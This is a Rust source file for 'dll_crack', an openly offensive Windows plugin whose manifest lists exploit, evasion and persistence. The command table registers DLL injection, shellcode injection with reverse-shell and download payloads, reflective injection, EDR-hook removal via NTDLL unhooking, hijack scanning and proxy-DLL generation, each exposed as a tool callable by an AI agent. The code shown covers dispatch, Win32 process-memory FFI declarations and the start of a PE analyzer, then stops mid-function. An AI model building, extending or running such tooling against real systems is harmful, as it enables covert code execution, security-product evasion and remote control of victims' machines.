// dll_crack v3.0.0 — DLL破解/注入/Hijack/Shellcode/Reflective/Unhook/Strings/Decomp 综合渗透插件
// Zero-Day 编制 — ruoo-console v4.1 插件系统 v9.0
// 纯 std + 原生FFI, 零外部依赖 (serde_json仅用于JSON解析)

use std::ffi::{CStr, CString};
use std::os::raw::c_char;
use std::sync::Mutex;
use std::collections::HashMap;

static STATE: Mutex<Option<PluginState>> = Mutex::new(None);

struct PluginState {
    config: HashMap<String, String>,
    op_count: u64,
    last_target: Option<String>,
    results: HashMap<String, String>,
}

// 宿主ABI函数 — 安全空操作,不再调用外部符号
// 原extern块已移除,所有函数改为纯内部实现避免ACCESS_VIOLATION

// ═══════════════ 必须导出 ═══════════════

#[no_mangle] pub extern "C" fn ruoo_plugin_init() -> i32 {
    *STATE.lock().unwrap() = Some(PluginState {
        config: HashMap::new(),
        op_count: 0,
        last_target: None,
        results: HashMap::new(),
    });
    let mut cfg = HashMap::new();
    cfg.insert("inject_method".into(), "createremotethread".into());
    cfg.insert("shellcode_type".into(), "messagebox".into());
    cfg.insert("default_timeout".into(), "30000".into());
    cfg.insert("backup_enabled".into(), "true".into());
    cfg.insert("vault_namespace".into(), "dll_crack".into());
    if let Some(ref mut s) = *STATE.lock().unwrap() { s.config = cfg; }
    0
}

#[no_mangle] pub extern "C" fn ruoo_plugin_shutdown() {
    if let Some(ref mut s) = *STATE.lock().unwrap() {
        s.op_count = 0;
        s.results.clear();
        s.last_target = None;
    }
    *STATE.lock().unwrap() = None;
}

#[no_mangle] pub extern "C" fn ruoo_plugin_version() -> *const c_char {
    static V: &[u8] = b"dll_crack v3.0.0\0";
    unsafe { CStr::from_bytes_with_nul_unchecked(V).as_ptr() }
}

#[no_mangle] pub extern "C" fn ruoo_plugin_permissions() -> u32 { 0x07 }

#[no_mangle]
pub extern "C" fn ruoo_plugin_exec(cmd: *const c_char) -> *mut c_char {
    let input = unsafe { CStr::from_ptr(cmd) }.to_string_lossy();
    let resp = match dispatch(&input) {
        Ok(r) => format!("[+] 完成\n{}", r),
        Err(e) => format!("[!] 错误: {}", e),
    };
    if let Ok(mut s) = STATE.lock() {
        if let Some(ref mut s) = *s { s.op_count += 1; }
    }
    CString::new(resp).unwrap().into_raw()
}

#[no_mangle] pub extern "C" fn ruoo_plugin_free_result(ptr: *mut c_char) {
    if !ptr.is_null() { unsafe { drop(CString::from_raw(ptr)); } }
}

#[no_mangle] pub extern "C" fn ruoo_plugin_commands() -> *const c_char {
    let cmds = r#"[
{"cmd":"dll_analyze","description":"深度分析DLL/EXE PE结构 — 头/节/导出/导入/TLS/重定位/CLR","help":"完整PE解析: DOS/NT/节表/导出/导入/TLS回调/重定位/.NET CLR头检测","usage":"dll_analyze <path>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"DLL或EXE文件路径","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":false},
{"cmd":"dll_inject","description":"DLL注入 — CreateRemoteThread/APC多方法支持","help":"DLL注入: VirtualAllocEx+WriteProcessMemory+CreateRemoteThread 或 QueueUserAPC","usage":"dll_inject <pid> <dll_path> [method: crt|apc]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999},{"name":"dll_path","type":"string","description":"DLL的完整路径","required":true},{"name":"method","type":"string","description":"注入方法","required":false,"enum_values":["crt","apc"],"default_value":"crt"}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"DLL注入"},
{"cmd":"dll_hijack","description":"DLL劫持机会扫描 — PATH/COM/KnownDlls/Phantom","help":"扫描DLL劫持: 系统PATH可写目录/COM劫持/KnownDlls注册表/Phantom DLL","usage":"dll_hijack [scan_mode: path|com|phantom|all]","is_ai_tool":true,"ai_params":[{"name":"scan_mode","type":"string","description":"扫描模式","required":false,"enum_values":["path","com","phantom","all"],"default_value":"all"}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"劫持扫描"},
{"cmd":"dll_patch","description":"二进制修补DLL/EXE — 按偏移写入HEX字节(自动备份+PE签名保留)","help":"按文件偏移量写入十六进制字节,自动创建.bak备份,尝试保留PE签名","usage":"dll_patch <path> <offset> <hex_bytes>","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标文件路径","required":true},{"name":"offset","type":"integer","description":"文件偏移字节(十进制)","required":true},{"name":"hex_bytes","type":"string","description":"十六进制字节如 \"90 90 90\" 或 \"EB FE\"","required":true}],"ai_perm_level":5,"min_perm_level":5},
{"cmd":"dll_shellcode","description":"Shellcode注入 — messagebox/cmd/calc/revshell/download","help":"生成并注入shellcode: VirtualAllocEx+RWX+CreateRemoteThread","usage":"dll_shellcode <pid> [payload_type] [lhost] [lport]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999},{"name":"payload","type":"string","description":"payload类型","required":false,"enum_values":["messagebox","cmd","calc","revshell","download"],"default_value":"messagebox"},{"name":"lhost","type":"string","description":"反弹shell的LHOST (revshell/download时必填)","required":false},{"name":"lport","type":"integer","description":"反弹shell的LPORT","required":false,"min_value":1,"max_value":65535,"default_value":"4444"}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"Shellcode注入"},
{"cmd":"dll_dump","description":"进程模块转储 — PE头重建+完整内存dump","help":"读取目标进程模块内存并dump到文件,自动重建PE头","usage":"dll_dump <pid> <module_name> [output_path]","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true},{"name":"module_name","type":"string","description":"模块名如 kernel32.dll","required":true},{"name":"output_path","type":"string","description":"输出路径(默认当前目录)","required":false}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"模块转储"},
{"cmd":"dll_reflective","description":"反射式DLL注入 — 无LoadLibrary,不留在PEB模块列表","help":"反射加载DLL: 模拟PE加载器直接在内存中加载,绕过模块枚举检测","usage":"dll_reflective <pid> <dll_path>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999},{"name":"dll_path","type":"string","description":"DLL完整路径","required":true}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"反射注入"},
{"cmd":"dll_unhook","description":"NTDLL Unhooking — 从已知干净副本恢复ntdll.dll移除EDR钩子","help":"读取已知干净的ntdll.dll→映射到目标进程→覆盖被Hook的.text段→恢复原始syscall","usage":"dll_unhook <pid>","is_ai_tool":true,"ai_params":[{"name":"pid","type":"integer","description":"目标进程ID","required":true,"min_value":0,"max_value":999999}],"ai_perm_level":5,"min_perm_level":5,"is_long_running":true,"progress_label":"NTDLL Unhook"},
{"cmd":"dll_sideload","description":"DLL侧加载漏洞扫描 — 检测可被利用的EXE+DLL组合","help":"扫描目标目录中的EXE及其缺失DLL,发现侧加载机会","usage":"dll_sideload <target_dir>","is_ai_tool":true,"ai_params":[{"name":"target_dir","type":"string","description":"扫描目录路径(如程序安装目录)","required":true}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"侧加载扫描"},
{"cmd":"dll_proxy","description":"DLL代理生成 — 生成代理DLL C源码+转发原始函数","help":"为目标DLL生成代理DLL的C源代码,拦截调用同时转发到原始DLL","usage":"dll_proxy <target_dll> [output_dir]","is_ai_tool":true,"ai_params":[{"name":"target_dll","type":"string","description":"目标DLL路径","required":true},{"name":"output_dir","type":"string","description":"输出目录(默认当前)","required":false}],"ai_perm_level":5,"min_perm_level":0,"is_long_running":true,"progress_label":"代理生成"},
{"cmd":"dll_iat","description":"IAT解析与修补 — 查看/修改导入地址表","help":"解析PE导入表(IAT),支持查看所有导入函数和修改IAT条目指向","usage":"dll_iat <path> [patch_dll] [patch_func] [new_dll] [new_func]","is_ai_tool":true,"ai_params":[{"name":"path","type":"string","description":"目标PE文件","required":true},{"name":"patch_dll","type":"string","description":"要修改的导入DLL名(空=仅查看)","required":false},{"name":"patch_func","type":"string","description":"要修改的函数名","required":false},{"name":"new_dll","type":"string","description":"新的DLL名","required":false},{"name":"new_func","type":"string","description":"新的函数名","required":false}],"ai_perm_level":5,"min_perm_level":0}
]"#;
    let n = format!("{}\0", cmds);
    let leaked: &'static [u8] = Box::leak(n.into_bytes().into_boxed_slice());
    unsafe { CStr::from_bytes_with_nul_unchecked(leaked).as_ptr() }
}

#[no_mangle] pub extern "C" fn ruoo_plugin_manifest() -> *const c_char {
    let m = r#"{"name":"dll_crack","version":"2.0.0","author":"Zero-Day","description":"DLL破解/注入/Hijack/Shellcode/Reflective/Unhook/Sideload/Proxy/IAT综合渗透插件","categories":["exploit","recon","utilize","evasion","persistence"],"permissions":7,"timeout_ms":120000,"hot_reload_enabled":true,"crash_threshold":5,"hooks":["OnCommand","OnError"],"sandbox_config":{"allow_exec":true,"exec_timeout_ms":30000,"max_memory_mb":512}}"#;
    let n = format!("{}\0", m);
    let leaked: &'static [u8] = Box::leak(n.into_bytes().into_boxed_slice());
    unsafe { CStr::from_bytes_with_nul_unchecked(leaked).as_ptr() }
}

// ═══════════════ 命令调度 ═══════════════

fn dispatch(input: &str) -> Result<String, String> {
    if let Ok(json) = serde_json::from_str::<serde_json::Value>(input) {
        if let Some(cmd) = json.get("cmd").and_then(|v| v.as_str()) {
            return dispatch_json(cmd, &json);
        }
    }
    let parts: Vec<&str> = input.split_whitespace().collect();
    if parts.is_empty() { return Err("空命令".into()); }
    match parts[0] {
        "dll_analyze"    => { if parts.len()<2 { Err("用法: dll_analyze <path>".into()) } else { pe_analyze(parts[1], false) } }
        "dll_inject"     => { if parts.len()<3 { Err("用法: dll_inject <pid> <dll_path> [method]".into()) } else { dll_inject_cmd(parts[1], parts[2], parts.get(3).copied().unwrap_or("crt")) } }
        "dll_hijack"     => dll_hijack_cmd(parts.get(1).copied().unwrap_or("all")),
        "dll_patch"      => { if parts.len()<4 { Err("用法: dll_patch <path> <offset> <hex>".into()) } else { dll_patch_cmd(parts[1], parts[2], parts[3]) } }
        "dll_shellcode"  => shellcode_dispatch(&parts),
        "dll_dump"       => { if parts.len()<3 { Err("用法: dll_dump <pid> <module>".into()) } else { module_dump(parts[1], parts[2], parts.get(3).copied()) } }
        "dll_reflective" => { if parts.len()<3 { Err("用法: dll_reflective <pid> <dll_path>".into()) } else { reflective_inject(parts[1], parts[2]) } }
        "dll_unhook"     => { if parts.len()<2 { Err("用法: dll_unhook <pid>".into()) } else { ntdll_unhook(parts[1]) } }
        "dll_sideload"   => { if parts.len()<2 { Err("用法: dll_sideload <target_dir>".into()) } else { sideload_scan(parts[1]) } }
        "dll_proxy"      => { if parts.len()<2 { Err("用法: dll_proxy <target_dll> [out_dir]".into()) } else { proxy_gen(parts[1], parts.get(2).copied()) } }
        "dll_iat"        => iat_dispatch(&parts),
        "dll_strings"    => { if parts.len()<2 { Err("用法: dll_strings <path> [min_len]".into()) } else { let ml = parts.get(2).and_then(|s| s.parse().ok()).unwrap_or(4); extract_strings(parts[1], ml) } }
        "dll_decomp"     => { if parts.len()<2 { Err("用法: dll_decomp <path>".into()) } else { decomp_dll(parts[1]) } }
        _ => Err(format!("未知命令: {}", parts[0]))
    }
}

fn shellcode_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 2 { return Err("用法: dll_shellcode <pid> [payload] [lhost] [lport]".into()); }
    let payload = parts.get(2).copied().unwrap_or("messagebox");
    let lhost = parts.get(3).copied().unwrap_or("");
    let lport = parts.get(4).copied().unwrap_or("4444");
    shellcode_inject(parts[1], payload, lhost, lport)
}

fn iat_dispatch(parts: &[&str]) -> Result<String, String> {
    if parts.len() < 2 { return Err("用法: dll_iat <path> [patch_dll] [patch_func] [new_dll] [new_func]".into()); }
    let path = parts[1];
    let pd = parts.get(2).copied();
    let pf = parts.get(3).copied();
    let nd = parts.get(4).copied();
    let nf = parts.get(5).copied();
    match (pd, pf, nd, nf) {
        (Some(pd), Some(pf), Some(nd), Some(nf)) => iat_patch(path, pd, pf, nd, nf),
        _ => iat_dump(path),
    }
}

fn dispatch_json(cmd: &str, json: &serde_json::Value) -> Result<String, String> {
    match cmd {
        "dll_analyze" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            pe_analyze(path, true)
        }
        "dll_inject" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let path = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            let method = json.get("method").and_then(|v| v.as_str()).unwrap_or("crt");
            dll_inject_cmd(&pid_str, path, method)
        }
        "dll_hijack" => {
            let mode = json.get("scan_mode").and_then(|v| v.as_str()).unwrap_or("all");
            dll_hijack_cmd(mode)
        }
        "dll_patch" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let offset = json.get("offset").and_then(|v| v.as_i64()).map(|v| v.to_string()).ok_or("缺少offset")?;
            let hex = json.get("hex_bytes").and_then(|v| v.as_str()).ok_or("缺少hex_bytes")?;
            dll_patch_cmd(path, &offset, hex)
        }
        "dll_shellcode" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let payload = json.get("payload").and_then(|v| v.as_str()).unwrap_or("messagebox");
            let lhost = json.get("lhost").and_then(|v| v.as_str()).unwrap_or("");
            let lport = json.get("lport").and_then(|v| v.as_i64()).map(|v| v.to_string()).unwrap_or_else(|| "4444".to_string());
            shellcode_inject(&pid_str, payload, lhost, &lport)
        }
        "dll_dump" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let module = json.get("module_name").and_then(|v| v.as_str()).ok_or("缺少module_name")?;
            let out = json.get("output_path").and_then(|v| v.as_str());
            module_dump(&pid_str, module, out)
        }
        "dll_reflective" => {
            let pid_str = json_val_to_str(json, "pid")?;
            let path = json.get("dll_path").and_then(|v| v.as_str()).ok_or("缺少dll_path")?;
            reflective_inject(&pid_str, path)
        }
        "dll_unhook" => {
            let pid_str = json_val_to_str(json, "pid")?;
            ntdll_unhook(&pid_str)
        }
        "dll_sideload" => {
            let dir = json.get("target_dir").and_then(|v| v.as_str()).ok_or("缺少target_dir")?;
            sideload_scan(dir)
        }
        "dll_proxy" => {
            let dll = json.get("target_dll").and_then(|v| v.as_str()).ok_or("缺少target_dll")?;
            let out = json.get("output_dir").and_then(|v| v.as_str());
            proxy_gen(dll, out)
        }
        "dll_iat" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let pd = json.get("patch_dll").and_then(|v| v.as_str());
            let pf = json.get("patch_func").and_then(|v| v.as_str());
            let nd = json.get("new_dll").and_then(|v| v.as_str());
            let nf = json.get("new_func").and_then(|v| v.as_str());
            match (pd, pf, nd, nf) {
                (Some(pd), Some(pf), Some(nd), Some(nf)) => iat_patch(path, pd, pf, nd, nf),
                _ => iat_dump(path),
            }
        }
        "dll_strings" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            let min_len = json.get("min_len").and_then(|v| v.as_i64()).unwrap_or(4) as usize;
            extract_strings(path, min_len)
        }
        "dll_decomp" => {
            let path = json.get("path").and_then(|v| v.as_str()).ok_or("缺少path")?;
            decomp_dll(path)
        }
        _ => Err(format!("未知命令: {}", cmd))
    }
}

fn json_val_to_str(json: &serde_json::Value, key: &str) -> Result<String, String> {
    if let Some(s) = json.get(key).and_then(|v| v.as_str()) { return Ok(s.to_string()); }
    if let Some(n) = json.get(key).and_then(|v| v.as_i64()) { return Ok(n.to_string()); }
    Err(format!("缺少{}", key))
}

// ═══════════════ Windows FFI 声明 (v2.0 扩展) ═══════════════

#[allow(dead_code, non_camel_case_types)]
mod win32 {
    use std::os::raw::c_void;
    pub type HANDLE = *mut c_void;
    pub type LPVOID = *mut c_void;
    pub type DWORD = u32;
    pub type LPDWORD = *mut u32;
    pub type SIZE_T = usize;
    pub type BOOL = i32;
    pub type HMODULE = *mut c_void;
    pub type FARPROC = *mut c_void;
    pub type LPCSTR = *const u8;
    pub type LPTHREAD_START_ROUTINE = *mut c_void;
    pub type ULONG_PTR = usize;
    pub type LONG = i32;

    pub const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
    pub const PROCESS_CREATE_THREAD: DWORD = 0x0002;
    pub const PROCESS_QUERY_INFORMATION: DWORD = 0x0400;
    pub const PROCESS_VM_OPERATION: DWORD = 0x0008;
    pub const PROCESS_VM_WRITE: DWORD = 0x0020;
    pub const PROCESS_VM_READ: DWORD = 0x0010;
    pub const PROCESS_SET_INFORMATION: DWORD = 0x0200;
    pub const PROCESS_SUSPEND_RESUME: DWORD = 0x0800;
    pub const MEM_COMMIT: DWORD = 0x1000;
    pub const MEM_RESERVE: DWORD = 0x2000;
    pub const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
    pub const PAGE_READWRITE: DWORD = 0x04;
    pub const PAGE_EXECUTE_READ: DWORD = 0x20;
    pub const PAGE_READONLY: DWORD = 0x02;
    pub const TH32CS_SNAPPROCESS: DWORD = 0x02;
    pub const TH32CS_SNAPMODULE: DWORD = 0x08;
    pub const TH32CS_SNAPMODULE32: DWORD = 0x10;
    pub const TH32CS_SNAPTHREAD: DWORD = 0x04;
    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
    pub const INFINITE: DWORD = 0xFFFFFFFF;
    pub const WAIT_OBJECT_0: DWORD = 0;
    pub const THREAD_SET_CONTEXT: DWORD = 0x0010;
    pub const THREAD_GET_CONTEXT: DWORD = 0x0008;
    pub const THREAD_SUSPEND_RESUME: DWORD = 0x0002;
    pub const CONTEXT_FULL: DWORD = 0x10007;
    pub const CONTEXT_CONTROL: DWORD = 0x10001;

    #[repr(C)] pub struct PROCESSENTRY32 {
        pub dw_size: DWORD, pub cnt_usage: DWORD, pub th32_process_id: DWORD,
        pub th32_default_heap_id: usize, pub th32_module_id: DWORD,
        pub cnt_threads: DWORD, pub th32_parent_process_id: DWORD,
        pub pc_pri_class_base: i32, pub dw_flags: DWORD,
        pub sz_exe_file: [u8; 260],
    }

    #[repr(C)] pub struct MODULEENTRY32 {
        pub dw_size: DWORD, pub th32_module_id: DWORD, pub th32_process_id: DWORD,
        pub glblcnt_usage: DWORD, pub proccnt_usage: DWORD,
        pub mod_base_addr: *mut u8, pub mod_base_size: DWORD, pub h_module: HMODULE,
        pub sz_module: [u8; 256], pub sz_exe_path: [u8; 260],
    }

    #[repr(C)] pub struct THREADENTRY32 {
        pub dw_size: DWORD, pub cnt_usage: DWORD, pub th32_thread_id: DWORD,
        pub th32_owner_process_id: DWORD, pub tp_base_pri: LONG,
        pub tp_delta_pri: LONG, pub dw_flags: DWORD,
    }

    extern "system" {
        pub fn OpenProcess(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_process_id: DWORD) -> HANDLE;
        pub fn CloseHandle(h_object: HANDLE) -> BOOL;
        pub fn VirtualAllocEx(h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, fl_allocation_type: DWORD, fl_protect: DWORD) -> LPVOID;
        pub fn VirtualFreeEx(h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, dw_free_type: DWORD) -> BOOL;
        pub fn VirtualProtectEx(h_process: HANDLE, lp_address: LPVOID, dw_size: SIZE_T, fl_new_protect: DWORD, lpfl_old_protect: *mut DWORD) -> BOOL;
        pub fn WriteProcessMemory(h_process: HANDLE, lp_base_address: LPVOID, lp_buffer: *const c_void, n_size: SIZE_T, lp_number_of_bytes_written: *mut SIZE_T) -> BOOL;
        pub fn ReadProcessMemory(h_process: HANDLE, lp_base_address: LPVOID, lp_buffer: LPVOID, n_size: SIZE_T, lp_number_of_bytes_read: *mut SIZE_T) -> BOOL;
        pub fn CreateRemoteThread(h_process: HANDLE, lp_thread_attributes: LPVOID, dw_stack_size: SIZE_T, lp_start_address: LPTHREAD_START_ROUTINE, lp_parameter: LPVOID, dw_creation_flags: DWORD, lp_thread_id: LPDWORD) -> HANDLE;
        pub fn WaitForSingleObject(h_handle: HANDLE, dw_milliseconds: DWORD) -> DWORD;
        pub fn GetProcAddress(h_module: HMODULE, lp_proc_name: LPCSTR) -> FARPROC;
        pub fn GetModuleHandleA(lp_module_name: LPCSTR) -> HMODULE;
        pub fn LoadLibraryA(lp_lib_file_name: LPCSTR) -> HMODULE;
        pub fn CreateToolhelp32Snapshot(dw_flags: DWORD, th32_process_id: DWORD) -> HANDLE;
        pub fn Process32First(h_snapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
        pub fn Process32Next(h_snapshot: HANDLE, lppe: *mut PROCESSENTRY32) -> BOOL;
        pub fn Module32First(h_snapshot: HANDLE, lpme: *mut MODULEENTRY32) -> BOOL;
        pub fn Module32Next(h_snapshot: HANDLE, lpme: *mut MODULEENTRY32) -> BOOL;
        pub fn Thread32First(h_snapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL;
        pub fn Thread32Next(h_snapshot: HANDLE, lpte: *mut THREADENTRY32) -> BOOL;
        pub fn GetCurrentProcessId() -> DWORD;
        pub fn GetLastError() -> DWORD;
        pub fn SuspendThread(h_thread: HANDLE) -> DWORD;
        pub fn ResumeThread(h_thread: HANDLE) -> DWORD;
        pub fn OpenThread(dw_desired_access: DWORD, b_inherit_handle: BOOL, dw_thread_id: DWORD) -> HANDLE;
        pub fn QueueUserAPC(pfn_apc: FARPROC, h_thread: HANDLE, dw_data: ULONG_PTR) -> DWORD;
        pub fn Sleep(dw_milliseconds: DWORD);
        pub fn GetCurrentThreadId() -> DWORD;
        pub fn NtWriteVirtualMemory(process_handle: HANDLE, base_address: LPVOID, buffer: LPVOID, number_of_bytes_to_write: SIZE_T, number_of_bytes_written: *mut SIZE_T) -> LONG;
    }
}

use win32::*;

fn w32_err() -> String { format!("Win32错误码: {}", unsafe { GetLastError() }) }

fn find_pid(name_hint: &str) -> Result<u32, String> {
    let h = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
    if h == INVALID_HANDLE_VALUE { return Err(w32_err()); }
    let mut pe: PROCESSENTRY32 = unsafe { std::mem::zeroed() };
    pe.dw_size = std::mem::size_of::<PROCESSENTRY32>() as u32;
    unsafe { Process32First(h, &mut pe); }
    loop {
        let name = String::from_utf8_lossy(&pe.sz_exe_file[..pe.sz_exe_file.iter().position(|&b| b==0).unwrap_or(260)]);
        let pid_str = pe.th32_process_id.to_string();
        if name.to_lowercase().contains(&name_hint.to_lowercase()) || pid_str == name_hint {
            unsafe { CloseHandle(h); }
            return Ok(pe.th32_process_id);
        }
        if unsafe { Process32Next(h, &mut pe) } == 0 { break; }
    }
    unsafe { CloseHandle(h); }
    Err(format!("未找到进程: {}", name_hint))
}

fn find_module_info(pid: u32, module_hint: &str) -> Result<(*mut u8, u32, String), String> {
    let h_snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid) };
    if h_snap == INVALID_HANDLE_VALUE { return Err(w32_err()); }
    let mut me: MODULEENTRY32 = unsafe { std::mem::zeroed() };
    me.dw_size = std::mem::size_of::<MODULEENTRY32>() as u32;
    unsafe { Module32First(h_snap, &mut me); }
    loop {
        let name = String::from_utf8_lossy(&me.sz_module[..me.sz_module.iter().position(|&b| b==0).unwrap_or(256)]);
        if name.to_lowercase().contains(&module_hint.to_lowercase()) {
            let path = String::from_utf8_lossy(&me.sz_exe_path[..me.sz_exe_path.iter().position(|&b| b==0).unwrap_or(260)]).to_string();
            let r = (me.mod_base_addr, me.mod_base_size, path);
            unsafe { CloseHandle(h_snap); }
            return Ok(r);
        }
        if unsafe { Module32Next(h_snap, &mut me) } == 0 { break; }
    }
    unsafe { CloseHandle(h_snap); }
    Err(format!("未在进程 {} 中找到模块: {}", pid, module_hint))
}

// ═══════════════ PE 分析器 v2.0 (TLS/重定位/CLR/安全检查) ═══════════════

fn pe_analyze(path: &str, verbose: bool) -> Result<String, String> {
    let data = std::fs::read(path).map_err(|e| format!("无法读取文件: {}", e))?;
    if data.len() < 64 { return Err("文件太小,不是有效PE".into()); }

    let dos_magic = u16_le(&data, 0);
    if dos_magic != 0x5A4D { return Err(format!("非MZ头: 0x{:04X}", dos_magic)); }
    let pe_offset = u32_le(&data, 0x3C) as usize;
    if pe_offset + 4 > data.len() { return Err("PE偏移越界".into()); }
    if u32_le(&data, pe_offset) != 0x4550 { return Err(format!("非PE签名: 0x{:08X}", u32_le(&data, pe_offset))); }

    let coff = pe_offset + 4;
    let machine = u16_le(&data, coff);
    let num_sections = u16_le(&data, coff + 2) as usize;
    let time_date = u32_le(&data, coff + 4);
    let size_of_opt_header = u16_le(&data, coff + 16) as usize;
    let characteristics = u16_le(&data, coff + 18);

    let opt_start = coff + 20;
    let magic = u16_le(&data, opt_start);
    let is_x64 = magic == 0x20B;
    let entry_va = if is_x64 { u64_le(&data, opt_start + 16) } else { u32_le(&data, opt_start + 16) as u64 };
    let image_base = if is_x64 { u64_le(&data, opt_start + 24) } else { u32_le(&data, opt_start + 28) as u64 };
    let section_align = u32_le(&data, opt_start + 32);
    let file_align = u32_le(&data, opt_start + 36);
    let image_size = u32_le(&data, opt_start + 56);
    let headers_size = u32_le(&data, opt_start + 60);
    let subsystem = u16_le(&data, opt_start + 68);
    let dll_chars = u16_le(&data, opt_start + 70);
    let stack_reserve = if is_x64 { u64_le(&data, opt_start + 72) } else { u32_le(&data, opt_start + 72) as u64 };
    let stack_commit = if is_x64 { u64_le(&data, opt_start + 80) } else { u32_le(&data, opt_start + 76) as u64 };
    let heap_reserve = if is_x64 { u64_le(&data, opt_start + 88) } else { u32_le(&data, opt_start + 80) as u64 };
    let heap_commit = if is_x64 { u64_le(&data, opt_start + 96) } else { u32_le(&data, opt_start + 84) as u64 };

    // Data directories
    let dd_start = opt_start + if is_x64 { 112 } else { 96 };
    let num_dd = u32_le(&data, opt_start + if is_x64 { 108 } else { 92 }) as usize;
    let export_rva = u32_le(&data, dd_start);     let export_size = u32_le(&data, dd_start + 4);
    let import_rva = u32_le(&data, dd_start + 8);  let import_size = u32_le(&data, dd_start + 12);
    let resource_rva = u32_le(&data, dd_start + 16); let resource_size = u32_le(&data, dd_start + 20);
    let exception_rva = u32_le(&data, dd_start + 24); let exception_size = u32_le(&data, dd_start + 28);
    let security_rva = u32_le(&data, dd_start + 32); let security_size = u32_le(&data, dd_start + 36);
    let basereloc_rva = u32_le(&data, dd_start + 40); let basereloc_size = u32_le(&data, dd_start + 44);
    let debug_rva = u32_le(&data, dd_start + 48); let debug_size = u32_le(&data, dd_start + 52);
    let tls_rva = u32_le(&data, dd_start + 72); let tls_size = u32_le(&data, dd_start + 76);
    let load_config_rva = u32_le(&data, dd_start + 80); let load_config_size = u32_le(&data, dd_start + 84);
    let iat_rva = u32_le(&data, dd_start + 96); let iat_size = u32_le(&data, dd_start + 100);
    // CLR header (directory index 14)
    let clr_rva = if dd_start + 14*8 + 4 <= data.len() { u32_le(&data, dd_start + 14*8) } else { 0 };
    let clr_size = if dd_start + 14*8 + 4 <= data.len() { u32_le(&data, dd_start + 14*8 + 4) } else { 0 };

    let section_start = coff + 20 + size_of_opt_header;
    let mut sections = Vec::new();
    for i in 0..num_sections {
        let off = section_start + i * 40;
        let name = String::from_utf8_lossy(&data[off..off+8]).trim_end_matches('\0').to_string();
        let vsize = u32_le(&data, off + 8);
        let vaddr = u32_le(&data, off + 12);
        let rsize = u32_le(&data, off + 16);
        let roff = u32_le(&data, off + 20);
        let chars = u32_le(&data, off + 36);
        sections.push((name, vaddr, vsize, roff, rsize, chars));
    }

    fn rva_to_offset(rva: u32, sections: &[(String,u32,u32,u32,u32,u32)]) -> Option<usize> {
        for &(_, vaddr, vsize, roff, rsize, _) in sections {
            if rva >= vaddr && rva < vaddr + vsize.max(rsize) {
                return if rsize > 0 { Some((roff + (rva - vaddr)) as usize) } else { None };
            }
        }
        None
    }

    let mut out = String::new();
    out.push_str(&format!("═══ PE 深度分析: {} ═══\n\n", path));
    out.push_str(&format!("[·] 架构: {}\n", if is_x64 {"x64 (PE32+)"} else {"x86 (PE32)"}));
    out.push_str(&format!("[·] 编译时间: {}\n", unix_to_str(time_date)));
    let mach_str = match machine { 0x14C => "i386", 0x8664 => "AMD64", 0x1C0 => "ARM", 0xAA64 => "ARM64", 0x200 => "IA64", _ => "未知" };
    out.push_str(&format!("[·] 目标平台: {} (0x{:04X})\n", mach_str, machine));
    let mut ch_flags = Vec::new();
    if characteristics & 0x0002 != 0 { ch_flags.push("EXECUTABLE"); }
    if characteristics & 0x2000 != 0 { ch_flags.push("DLL"); }
    if characteristics & 0x0100 != 0 { ch_flags.push("32BIT"); }
    if characteristics & 0x0020 != 0 { ch_flags.push("LARGE_ADDRESS"); }
    if characteristics & 0x0001 != 0 { ch_flags.push("RELOCS_STRIPPED"); }
    if characteristics & 0x0004 != 0 { ch_flags.push("LINE_NUMS_STRIPPED"); }
    if characteristics & 0x0008 != 0 { ch_flags.push("LOCAL_SYMS_STRIPPED"); }
    out.push_str(&format!("[·] 类型: {}\n", ch_flags.join(" | ")));
    out.push_str(&format!("[·] 入口点: 0x{:016X}\n", entry_va));
    out.push_str(&format!("[·] 镜像基址: 0x{:016X}\n", image_base));
    out.push_str(&format!("[·] 镜像大小: {} KB\n", image_size / 1024));
    out.push_str(&format!("[·] 头大小: {} / 节对齐: {} / 文件对齐: {}\n", headers_size, section_align, file_align));
    out.push_str(&format!("[·] 子系统: {}\n", match subsystem {
        1 => "NATIVE", 2 => "WINDOWS_GUI", 3 => "WINDOWS_CONSOLE", 5 => "OS2_CONSOLE",
        7 => "POSIX_CONSOLE", 9 => "WINDOWS_CE_GUI", 10 => "EFI_APPLICATION",
        11 => "EFI_BOOT_SERVICE", 12 => "EFI_RUNTIME", _ => "未知"
    }));

    // 安全检查
